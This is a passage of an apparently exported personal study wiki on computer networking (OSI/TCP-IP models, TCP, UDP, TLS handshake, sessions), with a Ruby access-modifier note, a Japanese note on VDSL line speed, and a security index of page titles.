Ethernet protocol reduce collision by adding a random wait time before
retrying to use the carrier. It also adds more and more wait time if it
sees the carrier is still congested. This behavior of using a exponentially
growing wait time is called **Exponential Backoff**. Many transmission
protocols such as Ethernet and WiFi use it.

However, the trick above is still not enough to power a big network such as
school or office network. One need to shrink the number of device on any
given shared carrier. This is called **Collision Domain**. This is often
done using a network switch, which break a network in multiple collision
domains. The switch keeps a list of MAC addresses on each side of a given
network and only passes information if necessary.

This approach is also basically how the Internet works (at a high level).

## MAC Address Table

A MAC address table is a mapping of a **Swhitchports** to MAC addresses. As
traffic flow through a switch, it will identify what devices are connected
to each port by their MAC addresses and record it in its MAC address table.


===

<!-- Source: computing/network/message-authentication-code.md -->
<!-- URL: /computing/network/message-authentication-code -->
<!-- Title: Message Authentication Code (MAC) -->
<!-- Wikilinks: [[computing/network/message-authentication-code]], [[network/message-authentication-code]], [[message-authentication-code]] -->

---
date: 2021-10-29T08:54
---

# Message Authentication Code (MAC)

The `MAC` field is similar to the checksum fields used in other PDUs.
However, where checksum are used for error detection (corruption during
transport), `MAC` is used as a security layer which check if the message
has been altered/tempered with during transit.

The way it works can be summarized in three steps:

1. Sender create a _digest_[^1] of the data payload
2. Sender encrypt the data payload using the symmetric key, encapsulate it
and pass the result to the [[transport-layer]]
3. Receiver decrypt the data payload using the symmetric key and create a
digest of the payload using the same algorithm and hash value that the
sender. If the two digests match, the integrity of the message is confirmed

[^1]: A digest is basically a small amount of data derived from the actual
data, created using a specific hashing algorithm and a pre-agreed hash
value (both agreed upon during the [[tls-handshake]])


===

<!-- Source: computing/network/method-access-control.md -->
<!-- URL: /computing/network/method-access-control -->
<!-- Title: Method Access Control -->
<!-- Wikilinks: [[computing/network/method-access-control]], [[network/method-access-control]], [[method-access-control]] -->

---
date: 2021-04-07T17:18
---

# Method Access Control

Method access control is the concept of using _access modifiers_ to change the
visibility of methods in a class. In Ruby by default, method are public unless
specified otherwise.

Ruby has the `public`, `private`, and `protected` access modifiers.

To make methods work inside the class but not available to the rest of the
program, one can use the `private` access modifier.

`protected` is an in-between access modifier:

-  From _inside_ the class `protected` methods are accessible like `public`
methods
-  From _outside_ the class `protected` methods act like `private` methods

## Access Modifiers and Getters/Setters

Getters and setters (in Ruby, the built-in `attr_*` methods) being methods,
their visibility can be changed just like other methods.

It easily becomes confusing because of Ruby's syntactical sugar. Using for
example `attr_accessor :name` accessor methods provides us with `name` and
`name=` getter/setter instance methods, and `@name` instance variables. The
setter instance method, particularly, is easily confused with a local
variable initialization or reassignement.

Let's see two examples using `private` and `protected`.

```ruby
class Account
  def initialize(name, balance=100)
    @name = name
    @balance = balance
  end

  attr_reader :name

  def display_balance(pin_number)
    if pin_number == pin
      puts "Balance: $#{balance}."
    else
      pin_error
    end
  end

  def withdraw(pin_number, amount)
    if pin_number == pin
      self.balance -= amount  # We need `self` here
      puts "Withdrew #{amount}. New balance: $#{balance}."
    else
      pin_error
    end
  end

  private

  attr_accessor :balance

  def pin
    @pin = 1234
  end

  def pin_error
    "Access denied: incorrect PIN."
  end
end

checking_account = Account.new('Dave', 1_000_000)
checking_account.display_balance(1234)
checking_account.withdraw(1234, 3_000)
```

On the example above, we use `self` with `balance=`, otherwise Ruby would
interprete `balance` as a new local variable (and return an error because
`balance = balance - amount` is intepreted as `balance = nil - amount`).

Here, `balance` and `balance=` accessor methods are accessible inside the
instance but cannot be called outside of it, i.e., `checking_account.balance`
is not permitted.

```ruby
class Student
  def initialize(n, g)
    @name = n
    @grade = g
  end

  def better_grade_than?(other_student)
    grade > other_student.grade  # => Note this line
  end

  protected

  attr_reader :grade
end

joe = Student.new('Joe', 18)
bob = Student.new('Bob', 16)

puts 'Well done!' if joe.better_grade_than?(bob)
```

Here, `grade` is accessible inside the instance but not outside. Would we use
`private` instead, accessor method `grade` (getter for instance `joe`) would
have been accessible, but the other accessor method `grade` (getter for
instance `bob`) would not, because we try to access it from outside.

Ruby would have raise an easy to misinterpret error message:

```irb
irb:8:in `better_grade_than?': private method `grade' called for #<Student:0x0000557a533462c8 @name="Bob", @grade=16> (NoMethodError)
```

Note `@name="Bob"`, this is the important part to know whether `private method
``grade'` concerns the method on the left or on the right.


===

<!-- Source: computing/network/networking-foundations.md -->
<!-- URL: /computing/network/networking-foundations -->
<!-- Title: Networking Foundations -->
<!-- Wikilinks: [[computing/network/networking-foundations]], [[network/networking-foundations]], [[networking-foundations]] -->

---
date: 2021-08-30T14:26
---

# Networking Foundations

## General Picture

Networking is a very vast subject. As a developer or software engineer, a
detailed view of how everything work is not necessary but having a
high-level picture of how the different parts work together goes a long
way.

We should have a general mental models that is good enough to understand
higher levels of abtraction protocols, such as
[[transmission-control-protocol]]# and [[http-protocol]]#.

### Physical Network

The high-level protocols named above rely on physical infrastructure in
order to function. They are _dependant_ of the limitations of such
infrastructure, such as network **bandwidth** and **latency**.

See [[physical-network]].

### Rules

Protocols are a locical sets of rules designed and engineered as they are.
See [[protocols]]# for more details.

### IP: Ennabling Communication Between Devices

**Internet Protocol** (IP) is a key part of how internet work. Having a
clear mental model of what it does is essential.

## What is Internet?

Internet was developped in the 1970s. The project has evolved from the
ARPANET (**A**dvanced **R**esearch **P**rojects **A**gency **NET**work) in
order to create a communication system that might survive a nuclear attack.

The idea of [Paul Baran](https://en.wikipedia.org/wiki/Paul_Baran) was to
break messages into blocks and send them as fast as possible in every
possible direction through the mesh network.

the Internet is made of a large number of independently opreated networks
which is fully distributed; there are no center control that decides how
packets are routed (theorically).

The independent networks have an interest in having an end-to-end
connectivity of every part of the network because the utility of the net is
that any device can communicate with any other device (a bit like phone
calls).

The key point is that Internet is a **network of networks**.

See a more detailed explanation and more on [Khan
Academy](https://www.khanacademy.org/partner-content/code-org/internet-works/v/what-is-the-internet).

### What is a Network?

A network is said of devices connected in a way that permits communication
and exchange of data. A simple example of network is to connect two
computers directly using a LAN cable and configuring their network
settings.

#### LAN: Local Area Network

A LAN or WLAN (for Wireless LAN) is said of multiple computers connected to
a central machine, generally a **hub** or a **switch** which lets them
communicate (rules may apply). This forms the network.

This is common in office environment and home network.

In a home, the central machine is generally a **router** which also assume
the role of a simple switch.

#### Inter-Network Communication

Each LAN network is confined to its _local_ environment and geographic
limitation. In order to create a network of networks (inter-network), we
need a way to enable communication between those networks. This is done
thanks to a networking computer called a **router**. Routers _route_
traffic to other networks. They act as _gateways_ into and out of the
network.

The Internet is an extrapolation of this principle: between each
sub-networks are systems of routers that direct the network traffic. This
is a simplification but still a good mental model to start with.

The router then connect to a a **Wide Area Network** or WAN which is likely
a router provided by the **Internet Service Provider** or ISP. The ISP's
routers themselve connect to the **backbone** of the Internet.

The hops from one computer to the backbone and then to the intended server
can be traced using the `traceroute` command.


===

<!-- Source: computing/network/networking-models.md -->
<!-- URL: /computing/network/networking-models -->
<!-- Title: Networking Models -->
<!-- Wikilinks: [[computing/network/networking-models]], [[network/networking-models]], [[networking-models]] -->

---
date: 2021-08-31T08:33
---

# Networking Models

There are a lot of moving pieces in a network. In order to simplify, or
more precisly to be able to focus on one area of the system, we often use
_models_.

Amongst other, the [OSI model](https://en.wikipedia.org/wiki/OSI_model) is
probably the most well known. Another one is the [Internet protocol
suite](https://en.wikipedia.org/wiki/Internet_protocol_suite), commonly
known as the TCP/IP, or historically the DoD (Department of Defense) model.

The first model has seven layers while the second only has four but both
models overlap in some way.

A model is just that: a model. They are useful to grasp how the system work
as a whole and permit to focus on some area of a system, however no model
will ever perfectly represent a real-world implementation.

## OSI model

The OSI model divides the layers according to their provided functions:
physical addressing, logical addressing, routing, encryption, compression,
etc.

The layers are:

- Layer 7: [[application-layer]]#
- Layer 6: Presentation
- Layer 5: Session
- Layer 4: [[transport-layer]]#
- Layer 3: [[internet-network-layer]]#
- Layer 2: [[link-data-link-layer]]#
- Layer 1: [[physical-network]]#


For a great overview of how packets move through a network at different
layer, check this [YouTube video](https://youtu.be/rYodcvhh7b8).

## Internet Protocol Suite

The TCP/IP model divides the layers according to the scope of
communications within each layer (local network, between networks, etc).

The layers are:

- Layer 4: [[application-layer]]#
- Layer 3: [[transport-layer]]#
- Layer 2: [[internet-network-layer]]#
- Layer 1: [[link-data-link-layer]]#

## Data Encapsulation

In network model, we use data encapsulation to hide data from one layer by
encapsulating it within a _data unit_ of the layer below.

A Protocol Data Unit (PDU) is an amount of data transferred over a network.
The name to refer to PDUs vary between layers. Some of the name may be
familiar:

- Link/Data Link layer: _frame_
- Internet/Network layer: _packet_
- Transport layer (TCP): _segment_
- Transport layer (UDP): _datagram_

The name may be different but a PDU almost always consists of a _header_
and a _data payload_, and sometimes a _trailer_ or _footer_:

```txt
+----------+--------------------------+
|          |                          |
|  Header  |        Data Payload      |
|          |                          |
+----------+--------------------------+
```

Note that this PDU does not have a trailer.

What is included in the header and trailer varies from protocol to protocol
but their purpose is the same: it provides protocol-specifit metadata about
the PDU. an Internet Protocol (IP) packet header would include the source
IP address and the destination IP address in order to correctly route the
packet.

The data payload of the PDU is, as its name implies, the data we want to
transport over the network.

Data encapsulation in network model is implemented by using this concept of
data payload. **The entire PDU from one layer (the header + data payload in
the text image above) becomes the data payload of the layer below.**

```txt
           +----------+--------------------------+
           |          |                          |
           |  Header  |        Data Payload      |
           |          |                          |
           +----------+--------------------------+
+----------+-------------------------------------+
|          |                                     |
|  Header  |            Data Payload             |
|          |                                     |
+----------+-------------------------------------+
```

If we imagine the first block to be the PDU for the TCP segment of the
Application layer, it (header + data payload) becomes one data payload for
the layer below, i.e. the IP packet.

This also work if we were to add a trailer/footer behind the data payload.

The benefit of this encapsulation approach is that the next layer doesn't
need to know how the protocol at a precedent layer work in order to
interact with it.

This means a TCP segment does not need to be concerned whether it's going
to inherint an HTTP request or an SMTP command. It just encapsulate the
data it was given from the layer above, add a necessary metadata (header)
and pass it on to the layer below it.

The abstraction that encapsulation offers lets us use different protocols
at different layer without having to worry about inter-dependence.


===

<!-- Source: computing/network/physical-network.md -->
<!-- URL: /computing/network/physical-network -->
<!-- Title: Physical Network -->
<!-- Wikilinks: [[computing/network/physical-network]], [[network/physical-network]], [[physical-network]] -->

---
date: 2021-08-31T19:53
---

# Physical Network

In #[[networking-models]], we learnt that the OSI model defines the
physical layer as the bottommost layer of its model. This layer deals with
the transfer of bits (binary data) converted into signals. The signal
depends on the transformation medium used: electrical signals, light
signals, radio waves etc.

Information is made of **bits** which can be defined as a pair of
opposites: on or off, or, in reality, 1 and 0. A bits has two possible
states, which is why we call a bit _binary code_.

Bits are like the atoms of information.

They are physically send by electricity, light and radio wave.

Now, to send a bit via electricity is pretty straightforward. However, to
differenciate between one 0 and more than one 0 consecutive, we need to use
a clock. The time per bits is agreed upon and that lets the machine counts
how many zero or how many one between the agreed upon laps of time.

This is basically what is going on inside an Ethernet wire. An Ethernet
wire is cheap but signal loss happens over just a few meters.

Something way faster is the light. We can send bits as light beam (light/no
light binary) using fiber optic cable.

A fiber optic cable is a thread of glass engineered to reflect light. The
bean of light bounces up and down the length of the cable until its
destination. Depending on the bounce angle we can send multiple bits
simultaneously, at the speed of light.

Wireless machine uses radio signal to send bits from one place to another.
The machine translates the ones and zeroes into radio wave of different
frequencies and the receiving machine reverse the process.

## Bandwidth

Bandwidth is the _amount_ (maximum transmission capacity) of a device. It
is measured by **bit rate** which is the number of bits that we can send
over a given period of time, usually measured in seconds.

Increasing bandwidth doesn't always result in a improvement of the
network's performance.

The bandwidth varies across the network. The core network is generally much
buffier than the part of the "last-mile" (see below).

When a bandwidth changes from high to low at a certain point, we call this
point a _bandwidth bottleneck_.

When dealing with a large amounts of data, low bandwidth is an issue.
However most of the time latency is the biggest factor vis-a-vis of the
performance of a networked application.

## Latency

Latency is the _time_ it takes for a bit to travel from the source to the
requesting device. We can think of it as a "delay".

### Types of Delay

The total latency between two points is the sum of all the following
delays:

- **Propagation delay:** the amount of time it takes for a message to
travel from sender to receiver. Ratio between distance and speed.
- **Transmission delay:** the amount of time it takes to add the data onto
the link (between all the network devices, when using more than one
network, which is typically the case on Internet). Can be checked with
`traceroute`.
- **Processing delay:** the amount of time necessary for our data to being
processed in various ways.
- **Queuing delay:** the amout of time the data is _queued_ or _buffered_
when there is more data than the device can handle.

### Other Vocabulary

- **Last-mile latency:** generally the slowest link on the path. This is
often the delays between the ISP's network and the home network and is were
most of the delays happen.
- **Round-Trip Time (RTT):** the amount of time for a signal to be sent +
teh length of time for an acknowledgment/response to be received.

## Network Devices

- **Network Interface Card (NIC):** a hardware component that understand
the Ethernet protocol and translate (the job of an _interface_) it for the
computer. On the other way, it translates the computer instructions into
Ethernet protocol readable format.
- **Network HUB:** a hub is a hardware component that replicates the
messages it receives and forwards it back to all of the devices connected
to it, without distinction.
- **Switches:** similar to the hub, but unlike it, it reads the destination
address (the [[mac-addresses]]#) in order to send the received messages
_only_ to the device for which it was intended.


===

<!-- Source: computing/network/protocols.md -->
<!-- URL: /computing/network/protocols -->
<!-- Title: Protocols -->
<!-- Wikilinks: [[computing/network/protocols]], [[network/protocols]], [[protocols]] -->

---
date: 2021-08-30T20:26
---

# Protocols

Protocols are a _system of rules_. In computer networks, we can refere to
them as:

> A set of rules governing the exchange or transmission of data.

There are a lot of network communication protocols. The most famous being
IP, SMTP, TCP, HTTP, DNS etc.

Those protocols can be separated in roughly two category:

1. Protocols developed to address different aspects of network
   communication
2. Protocols developed to address the same aspect of network communication
   but in a different way or for a specific use-case

## Protocols for Different Aspects of Communication

In order to communicate on the network, we need a set of **syntactical
rules** that govern the **structure** of the message: in what order should
the content of a message be sent to be understood by the receiver? We may
also want to control the **flow** and the **order** of the messages. We can
call this the **message transfer** rules of how communication should be
conducted.

In this first category we can compare TCP and HTTP: they are two protocols that
address different aspects of communication. TCP assures the transfer of
messages between applications while HTTP is about the structure of those
messages.

## Protocols for Same Aspect of Communication in Different Way

In the second category, we can group protocol that relates to the same
aspect of communication (i.e. the _flow_ and _order_ of the message) but
use different sets of rules, or _protocols_, to achieve it.

In this category, TCP and UDP would be a good examples of two protocs that
address the same aspect of communication: the transfer of message between
applications, but in different ways.


===

<!-- Source: computing/network/stateful-web-app.md -->
<!-- URL: /computing/network/stateful-web-app -->
<!-- Title: Stateful Web Applications -->
<!-- Wikilinks: [[computing/network/stateful-web-app]], [[network/stateful-web-app]], [[stateful-web-app]] -->

---
date: 2021-09-22T09:04
---

# Stateful Web Applications

[[http-protocol]] is a _stateless_ protocol. However most of the web
applications we use nowadays needs to maintain a certain state, as
otherwise we would have to login each time we request a new page.

There are several techniques a web developer can use to simulate a stateful
experience.

## Sessions

To maintain a sense a statefulness, web servers can send a unique token
that is sent back by the user's browser. This token is referred to as
**session identifier**.

Technically, each request is still stateless and do not know about the
previous one, but the `session id` creates the illusion of a persistent
connection between requests.

The server has to do some work to simulate statefulness. In particular, it
has to parse the `session id`, check it it still valid (for security
reason) and craft a personalized response for this request.

### HTTP Cookies

HTTP Cookies are small files stored in the browser, that contain the
session information. The session data is always stored on the server:
cookies are used to _compare_ what the client has with what the server has
and make sure, for example, that the session hasn't been forged. For this
reason the cookies' data must remain secret.

ID sent with session are (supposed to be) unique and expires after a short
period of time. When a session expires, one needs to login again. The
session also (is supposed to) expires when one log out.

### AJAX

AJAX is short for **A**synchronous **J**avascript and **X**ML. This
technology lets you send and receive requests _without_ a full page
refresh. All requests are performed _asynchronously_ or, in simple term,
without a page reload/refresh.

Responses from AJAX requests are processed by `callback`s. A `callback` is
a logic code passed to function to be executed after a certain event has
happened; in this case, when the response is returned.


===

<!-- Source: computing/network/tls-authentication.md -->
<!-- URL: /computing/network/tls-authentication -->
<!-- Title: TLS Authentication -->
<!-- Wikilinks: [[computing/network/tls-authentication]], [[network/tls-authentication]], [[tls-authentication]] -->

---
date: 2021-11-03T12:26
---

# TLS Authentication

One way to identify the other party during the message exchange is to use
certificate.

The certificate sent by the server during the [[tls-handshake]] contains
various information such as who the owner is.

In the grand lines, after sending its certificate and its _public_ key, the
server:

- Creates and sends a _signature_ (encrypted data) as well as the original
data from which the signature was created
- The client, upon receiving, decrypt the signature using the server's
public key and compare it to the non-encrypted data.

If it matches, then the client knows the encrypted signature could have only
been created with the server's private key.

This mechanism, however, does not protect against impersonation. This is
the role of...

## Certificate Authorities and the Chain of Trust

Certificate Authorities (CAs) are trustworthy parties. They issue
certificates and ensure:

1. The party that asks for a certificate is really who they say they are
(and they own the domain/server they claim to own)
2. Digitally signs the certificate being issued (see signature above)

There are different CAs: **Root** CAs and **Intermediate** CAs. Client
software such as browser have a list of these authorities along with their
Root Certificates (including public key).

When receiving a certificate for checking, the browser can go up the chain
of the Root Certificate stored in order to verifies its authenticity.


===

<!-- Source: computing/network/tls-encryption.md -->
<!-- URL: /computing/network/tls-encryption -->
<!-- Title: TLS Encryption -->
<!-- Wikilinks: [[computing/network/tls-encryption]], [[network/tls-encryption]], [[tls-encryption]] -->

---
date: 2021-11-03T12:01
---

# TLS Encryption

TLS sets up an encrypted connection via the [[tls-handshake]]. It uses both
_symmetric_ and _asymmetric_ key encryption.

## Symmetric Key Encryption

Symmetric key encryption is a system where a key is shared between the two
parties who wish to exchange message securely.

In this system, both parties agree on a secret key and keep a copy of it.
The same key is used to **encrypt** and to **decrypt** a message.

To be secure, this system relies on the shared key being secret. In other
words, none other than the participant shall have access to the shared key.

This make the first exchange of encryption keys a challenge: how do sender
and receiver exchange the encryption keys securely in the first place?

This concern is one reason the _asymmetric_ key encryption was created.

## Asymmetric Key Encryption

Also known as _public_ key encryption.

In this system, a **pair** of keys, **public** and **private** key is used
to respectively encrypt and decrypt a message. Contrary to the symmetric
key, one key cannot do both.

Message encrypted with the public key can _only_ be decrypted with the
private key. The public key is, as its name implies, public, and the
private key shall be kept securely by the person or system who generated
it.

One big difference with the symmetric system is that asymmetric encryption
is a one way direction system: for two person to be able to communicate,
both need a private key and the public key of the other party.

## Cipher Suites

A _cipher_ is a cryptographic algorithm: the sum of all steps necessary to
perform encyption, decryption and other related tasks.

A cipher _suite_ is a suite, meaning a set of ciphers.


===

<!-- Source: computing/network/tls-handshake.md -->
<!-- URL: /computing/network/tls-handshake -->
<!-- Title: TLS Handshake -->
<!-- Wikilinks: [[computing/network/tls-handshake]], [[network/tls-handshake]], [[tls-handshake]] -->

---
date: 2021-10-27T20:42
---

# TLS Handshake

The TLS Handshake is a 4 steps, fairly complex process. It takes place
after the TCP Handshake and assumes TCP is being used at the
[[transport-layer]].

```txt
                                 Client  Server
                       ClientHello |\      |
                  Protocol version | \     |
                     Cipher Suites |  \    |
                                   |   \   |
                                   |    \  |
                                   |     \ |
                                   |      \| ServerHello
                                   |      /| Protocol version
                                   |     / | Cipher Suites
                                   |    /  | Certificates
                                   |   /   | ServerHelloDone
                                   |  /    |
                                   | /     |
                ClientKeyExchange  |/      |
               (Pre-master secret) |\      |
                  ChangeCipherSpec | \     |
                          Finished |  \    |
                                   |   \   |
                                   |    \  |
                                   |     \ |
                                   |      \| ChangeCipherSpec
                                   |       | Finished
                                   |       |
                                   |       |
```

1. After the TCP `ACK`, TLS Handshake sends a `ClientHello` message. This
message contains the maximum version of TLS protocol and Cipher Suites that
the client is able to use.
2. Server receives `ClientHello` and responds with a `ServerHello` which
sets the protocol version and Cipher Suites (amongst other things). It also
sends its certificate (including its **public key**) and a
`ServerHelloDone` to indicate the end of this step of the handshake.
3. Client receives the `ServerHelloDone` marker and initiates the key
exchange process. It starts with a newly generated _pre-master secret_
encrypted with the server's public key which the client sends to the
server using the `ClientKeyExchange` message. Both then use this _pre-master
secret_ to generate the same symmetric key. The client finally sends a
`ChangeCipherSpec` and a `Finished` flags to indicate it is ready to
respectively starts communicating with the symmetric key and indicates the
TLS Handshake is over.
4. The server sends the two same message and flag to indicate acknowledgment.

After the four steps, the client and server can finally begin to
communicate securely using the symmetric key.


===

<!-- Source: computing/network/transmission-control-protocol.md -->
<!-- URL: /computing/network/transmission-control-protocol -->
<!-- Title: Transmission Control Protocol (TCP) -->
<!-- Wikilinks: [[computing/network/transmission-control-protocol]], [[network/transmission-control-protocol]], [[transmission-control-protocol]] -->

---
date: 2021-09-13T21:00
---

# Transmission Control Protocol (TCP)

Transmission Control Protocol (TCP) is a protocol of transmission geared
toward reliability. It is defined in
[RFC793](https://www.ietf.org/rfc/rfc793.txt).

TCP offers reliability to a communication system that is inherently _not_
reliable.

TCP **must** recover damaged, lost or un-ordered data.

This reliability makes TCP a great choice for many networked applications.
However this reliability comes at a price: both in performance and
complexity.

Data encapsulation and multiplexing is possible using...

## TCP Segments

TCP Segments are the Protocol Data Unit (PDU) of TCP: Segment Header and
Segment Payload. In the Segment Header, the Source Port and Destination
Port permit multiplexing.

## TCP Connections

TCP is a **connection-oriented protocol**. It won't start sending
application data until a connection has been established between
application processes.

In order to establish a connection, TCP uses a **Three-way Handshake**:

```txt
                                 Sender  Receiver
          Sender send SYN Segments |\      |
                                   | \     |
                                   |  \SYN |
                                   |   \   |
                                   |    \  |
                                   |     \ |
                                   |      \| Receiver receives SYN Segment,
                                   |      /| Responds with SYN ACK Segment
                                   | SYN / |
                                   | ACK/  |
                                   |   /   |
                                   |  /    |
                                   | /     |
Receiver receives SYN ACK Segment, |/      |
         Responds with ACK Segment |\      |
                                   | \     |
                                   |  \ACK |
                                   |   \   |
                                   |    \  |
                                   |     \ |
                                   |      \| Receiver receives ACK Segment,
                                   |       | Connection is established!
                                   |       |
                                   |       |
```

In order:

- Sender sends a **SYN** message (a TCP Segment with the `SYN` flag set to
`1`)
- Upon receiving the SYN message, Receiver sends back a SYN ACK message (a
TCP Segment with the `SYN` and `ACK` flags set to `1`)
- Upon receiving the SYN ACK, the sender then sends an ACK message (a TCP
Segment with the `ACK` flag set to `1`)

Sender can start sending application data right after sending the ACK
message, but Receiver needs to receive the ACK before sending anything
back. One reason is to be able to synchronise `SYN` sequence numbers used
during the connection.

{.ui .message .info}
There is also a `FIN` flag used in the **Four-way Handshake**. It signals
the termination of the connection.

See also [Two Generals'
Problem](https://en.wikipedia.org/wiki/Two_Generals'_Problem) and this
[YouTube video](https://youtu.be/IP-rGJKSZ3s) for more an easy
explaination.


===

<!-- Source: computing/network/transport-layer.md -->
<!-- URL: /computing/network/transport-layer -->
<!-- Title: Transport Layer -->
<!-- Wikilinks: [[computing/network/transport-layer]], [[network/transport-layer]], [[transport-layer]] -->

---
date: 2021-09-10T09:51
---

# Transport Layer

The Transport layer is the key to how networked applications talk to each
other.

Important concept to grasp are:

- Multiplexing, demultiplexing, and the use of network ports
- How ports works with IP addresses (conceptualy, a network sockets)
- Socket object (at implementation level)
- Network (un)reliability and its engineering
- Connection-oriented and connectionless protocol
- Difference and trade-offs of TCP and UDP
- Three-way-handshake (SYN, SYN ACK, ACK)
- Congestion avoidance in TCP

Internet Protocol and its system of addressing intend to provide
communication between _hosts_ (devices). Hosts can be on the same or a
different network and thanks to IP the communication works. However IP only
permits a message from one host to the other and no more than that.

Because of this limitation, with IP alone we cannot communicate between
different application running on different or even the same host.

Indeed there are generally multiple applications running on the same host.
These applications all want to send and receive data simultaneously.

To do so, we need _multiplexing_ and _demultiplexing_.

## Multiplexing and Demultiplexing

Multiplexing, and its reverse process demultiplexing, as a general concept
can be applied to a lots of contexts in communication network. Think how an
optical fibres can carry multiple light signals at differnt angles of
recration, or radio waves carrying signals at different frequencies. These
are examples of multiplexing. At the Transport level though, multiplexing
is done using **network ports**.

### Ports

A port is like an integer between the range 0-65535 which serves as an
identifier for a specific process running on a host. The range is separated
in three sub-range:

- **0-1023**: well-known ports. Used for commonly used network services
such as HTTP (80), HTTPS (443), SMTP (25), DNS (53) etc.
- **1024-49151**: registered ports. Assigned to private entities but
sometimes used for _[ephemeral
ports](https://en.wikipedia.org/wiki/Ephemeral_port)_
- **49152-65535**: dynamic ports (or private ports). Used for customized
services or for allocation as _ephemeral ports_.

Services running on a server directly are most likely using a port in the
_well-known_ range (first range). For example a web server using HTTP will
likely have port 80 assigned to it. We say the web server is _listening_ on
port 80.

A service running on a client machine like in a browser, however, will
instead use an _ephemeral_ or temporary port assigned to it by the
operating system (third range).

The source and destination port numbers are included in the Protocol Data
Units (PDU) for the transport layer in two header fields aptly named
"Source Port" and "Destination Port".

Using both the IP address and the port number permets end-to-end
communication between specific applications on a different machines. This
combination is referred to as _communication end-point_. The communication
end-point is referred to as a **socket**.

We can use the `netstat -ntup` command to produce a list of active network
connections.

### Sockets

The term "sockets" is used differently depending on the context. As a
concept, it defines an endpoint for inter-process communication.

For Internet communication, it is as described above a inter-process
communication mechanism between networked processes on different machine,
but sometimes on the same.

UNIX sockets are a different beast: it's a mechanism for communication
between local processes running on the same machine.

In programming, a _socket_ object is often instantiated; this object will
take care of some of the network and communication-related tasks.

Most language follow the [Berkley
sockets](https://en.wikipedia.org/wiki/Berkeley_sockets) API model for
their implementation.

## Protocol

- [[transmission-control-protocol]]#
- [[user-datagram-protocol]]#


===

<!-- Source: computing/network/user-datagram-protocol.md -->
<!-- URL: /computing/network/user-datagram-protocol -->
<!-- Title: User Datagram Protocol (UDP) -->
<!-- Wikilinks: [[computing/network/user-datagram-protocol]], [[network/user-datagram-protocol]], [[user-datagram-protocol]] -->

---
date: 2021-09-14T08:43
---

# User Datagram Protocol (UDP)

Contrary to [[transmission-control-protocol]], User Datagram Protocol (UDP)
doesn't have a mechanism to reliably transfer data through sequencing and
retransmission of lost data and flow control/congestion avoidance.

The Protocol Data Unit (PDU) of UDP is called a **Datagram**. Like always,
it encapsulates the data form the layer above into a payload and adds
header informations.

Again, contrary to TCP, UDP's Datagram Header Fields are quite simple:

- Source Port
- Destination Port
- Length (in bits, uncluding encapsulated data)
- Checksum (optional in IPv4, required in IPv6)

Thanks to the Source and Destination Port numbers, UDP can do multiplexing
just like TCP does. The comparison stops here though. All the nify things
TCP does, UDP cannot.

## Why Use UDP?

TCP is reliable but it comes at the cost of overhead and complexity. UDP is
simple. Simplicity for engineer provies _speed_ and _flexibility_.

UDP is a **connectionless** protocol: using UDP at the [[transport-layer]],
application can just start sending data without having to wait for a
connection to be established with the receiver and the delay induced by
waiting for acknowledgements (`ACK`) and retransmission of lost/corrupt
data.

As there is no in-order delivery, this means _Head-of-line blocking_ is not
an issue (at the Transport layer, at least). Depending on the application,
the software engineer will want to implement some of the functionality that
UDP doesn't provide, at the Application layer. Which functionality is
dependant on the application itself.

A voice/video calling application can do with occasional drop of data,
resulting in a slighty glitchy call, but would want to implement an
in-order delivery.

UDP is like a base template to build on top of. Although flexible,
UDP-based application should implement some sort of congestion aboidance in
order to not overwhelm the network their are using.


===

<!-- Source: computing/network/vdsl.md -->
<!-- URL: /computing/network/vdsl -->
<!-- Title: VDSL 方式 -->
<!-- Wikilinks: [[computing/network/vdsl]], [[network/vdsl]], [[vdsl]] -->

---
date: 2020-08-02
tags:
  - 日本
  - internet
---

# VDSL 方式

回線が遅いのなぜだと思って調べた。

ルータの WAN のポートをはさすがに 1Gb/s 対応なのに、 100Mb/s しか出してくれんかった。

```sh
$ ethtool eth0
Settings for eth0:
	Supported ports: [ TP MII FIBRE ]
	Supported link modes:   10baseT/Half 10baseT/Full 
	                        100baseT/Half 100baseT/Full 
	                        1000baseT/Full 
	Supported pause frame use: Symmetric
	Supports auto-negotiation: Yes
	Supported FEC modes: Not reported
	Advertised link modes:  10baseT/Half 10baseT/Full 
	                        100baseT/Half 100baseT/Full 
	                        1000baseT/Full 
	Advertised pause frame use: Symmetric
	Advertised auto-negotiation: Yes
	Advertised FEC modes: Not reported
	Link partner advertised link modes:  10baseT/Half 10baseT/Full 
	                                     100baseT/Half 100baseT/Full 
	Link partner advertised pause frame use: No
	Link partner advertised auto-negotiation: Yes
	Link partner advertised FEC modes: Not reported
	Speed: 100Mb/s
	Duplex: Full
	Port: MII
	PHYAD: 1
	Transceiver: internal
	Auto-negotiation: on
	Supports Wake-on: g
	Wake-on: d
	Link detected: yes
```

見てのとおり、 `Supported` は 1Gb/s を宣伝しているが、 `Link partner` は 100Mb/s しか出してくれません。

理由が分かった。うちって [VDSL
方式](https://flets.com/first/kouji/const_apartment_vdsl.html)なのね。

## 光配線方式と VDSL 方式

実は2種類のネット回線がありますね。

公式際とには大きく「1Gb/s の光！」と堂々記載しているのにちょっと裏切られた気持ちです。

まあ、先に調べろって話ですね。

とはいえ、100Mb/s MAX の中、平均 80 Mb/s 以上あるのはなかなかいける。

{.ui .info .message}
**メモ:** 次引っ越す時は必ず光配線方式を必須条件にする。


===

<!-- Source: computing/security.md -->
<!-- URL: /computing/security -->
<!-- Title: Security -->
<!-- Wikilinks: [[computing/security]], [[security]] -->

---
date: 2020-09-15T07:34
---

Security
========

Portals
-------

-   [[what-is-security]]#
-   [[secure-ssh-key-generation]]#
-   [[plain-text-password-eicar]]#
-   [[osint-introduction]]#
-   [[gpg-unsafe-permissions]]#
-   [[what-is-malware]]#
-   [[threat-modeling]]#
-   [[what-is-opsec]]#
-   [[difference-between-penetration-tester-and-red-teamer]]#
-   [[the-confused-deputy-problem]]#
-   [[ssdlc/economy-of-mechanism]]#
-   [[android]]#
-   [[install-kali-nethunter-on-pixel-3a]]#

### Secure Software Development LifeCycle

#### Secure Software Concepts

-   [[core-security-principles]]#
-   [[integrating-security-into-software]]#

#### Secure Software Lifecycle Management

-   [[software-development-methodologies]]#
-   [[managing-software-lifecycle-risk]]#
-   [[managing-software-operational-security]]#
-   [[decommissioning-software-securely]]#

#### Secure Software Requirements

-   [[discovering-secure-software-requirements]]#
-   [[data-protection]]#
-   [[documenting-software-requirements]]#

### Governance, Risk and Compliance (GRC)

-   Information Security Management System
-   [[it-governance]]#
-   [[iso-iec-27001]]#: Information Security Management
-   [[pci-standards]]#: Payment Card Industry Data Security
    Standard
-   NIST CSF: Security Framework
-   NIST 800-53: Security and Privacy Controls for Information Systems
    and Organizations
